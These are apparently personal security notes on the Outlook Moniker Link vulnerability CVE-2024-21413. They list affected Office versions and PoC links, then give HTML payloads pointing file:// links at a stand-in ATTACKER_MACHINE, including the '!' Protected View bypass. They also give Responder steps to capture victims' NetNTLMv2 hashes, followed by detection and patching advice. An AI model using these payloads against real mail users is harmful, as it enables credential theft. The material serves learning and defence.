## Moniker Link CVE-2024-21413

### Tool: Responder, SMTP client

### PoC: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

### Severity: Critical

### Scoring: 9.8

### MS Article: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413

### Affected MS Office releases:

#### 1) Microsoft Office LTSC 2021	(Version: from 19.0.0)

#### 2) Microsoft 365 Apps for Enterprise (Version: from 16.0.1)

#### 3) Microsoft Office 2019 (Version: from 16.0.1)

#### 4) Microsoft Office 2016 (Version: from 16.0.0 before 16.0.5435.1001)

### Example payload: (Moniker Link type: file://)

#### 1) <p><a href="file://ATTACKER_MACHINE/test"<Click me</a></p<

### Outlook's Protected view bypass: (Special character: !)

#### 1) <p><a href="file://ATTACKER_MACHINE/test!exploit"<Click me</a></p<

### POC: https://github.com/CMNatic/CVE-2024-21413

### Steps:

#### 1) sudo responder -I INTERFACE

#### 2) Modify the exploit PoC according to use case

#### 3) Run the exploit

#### 4) User clicks the hyperlink and his NetNTLMv2 hash is been captured by our responder server.

## DETECTION

### 1) YARA rule written by Florian Roth: https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar

### 2) Wireshark: The SMB request from the victim to the client can be seen in a packet capture with a truncated NetNTLMv2 hash

## REMEDIATION

#### 1) Patch to the latest version if possible: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413 or https://www.catalog.update.microsoft.com/Home.aspx

#### 2)  Remind users to:

##### Do not click random links 

##### Preview links before clicking them

##### Forward suspicious emails to the respective department responsible for cybersecurity
